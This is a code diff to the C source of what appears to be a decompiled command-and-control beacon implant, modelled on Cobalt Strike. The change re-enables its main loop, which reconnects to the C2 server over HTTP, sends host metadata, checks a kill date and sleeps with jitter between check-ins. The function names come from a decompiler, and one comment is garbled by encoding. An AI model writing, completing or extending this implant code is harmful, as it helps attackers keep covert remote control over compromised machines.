@@ -12,6 +12,7 @@
 #include "function.h"
 #include "task.h"
 
+
 #ifdef _M_X64
 #pragma comment(lib,"tomcrypt_x64.lib")
 #else
@@ -132,57 +133,58 @@ int main()
 			lpszServerName = 1;
 		}
 
-		Close_http_Handle();
-		call_sleep(dwMilliseconds);
-		//else {
-		//	sub_1000715A();
+		//Close_http_Handle();
+		//call_sleep(dwMilliseconds);
+		else {
+			//sub_1000715A();
 
-		//	if (get_DWORD(28))
-		//	{
-		//		sub_10003D57(4096);
-		//	}
-		//	else
-		//	{
-		//		sub_10003D57(0x80000);
-		//	}
-		//	sub_10005DFB();
-		//	sub_10005725();
-		//	if (sub_10002ECF())
-		//	{
-		//		end_beacon();
-		//	}
-		//	if (Globala6 > 0)
-		//	{
-		//		Close_http_Handle();
-		//		set_winit_http(Buffer_host, nServerPort, lpszAgent);
-		//		sned_generate_Metadata();
-		//	}
-		//}
-		//Close_http_Handle();//·ÀÖ¹ÄÚ´æÐ¹Â¶
-		//if (Beacon_kill_data())
-		//{
-		//	Beacon_exit();
-		//}
-		//if (!dwMilliseconds)
-		//{
-		//	break;
-		//}
-		//if (jitter)
-		//{
-		//	lpszServerNamea = ::dwMilliseconds * jitter / 0x64;
-		//	v10 = lpszServerNamea ? random_dword_4() % lpszServerNamea : 0;
-		//	v11 = ::dwMilliseconds;
-		//	if (v10 < ::dwMilliseconds)
-		//	{
-		//		v11 = ::dwMilliseconds - v10;
-		//	}
-		//	call_sleep(v11);
-		//}
-		//else
-		//{
-		//	call_sleep(dwMilliseconds);
-		//}
+			//if (get_DWORD(28))
+			//{
+			//	sub_10003D57(4096);
+			//}
+			//else
+			//{
+			//	sub_10003D57(0x80000);
+			//}
+			//sub_10005DFB();
+			//sub_10005725();
+			//if (sub_10002ECF())
+			//{
+			//	end_beacon();
+			//}
+			if (Globala6 > 0)
+			{
+				Close_http_Handle();
+				set_winit_http(Buffer_host, nServerPort, lpszAgent);
+				send_generate_Metadata();
+			}
+		}
+		Close_http_Handle();//·ÀÖ¹ÄÚ´æÐ¹Â¶
+		if (Beacon_kill_data())
+		{
+			Beacon_exit();
+		}
+		if (!dwMilliseconds)
+		{
+			break;
+		}
+		if (jitter)
+		{
+			//lpszServerNamea = ::dwMilliseconds * jitter / 0x64;
+			//v10 = lpszServerNamea ? random_dword_4() % lpszServerNamea : 0;
+			//v11 = ::dwMilliseconds;
+			//if (v10 < ::dwMilliseconds)
+			//{
+			//	v11 = ::dwMilliseconds - v10;
+			//}
+			call_sleep(dwMilliseconds);
+		}
+		else
+		{
+			call_sleep(dwMilliseconds);
+		}
 	}
 
 	free(Block);
+	return 0;
 }
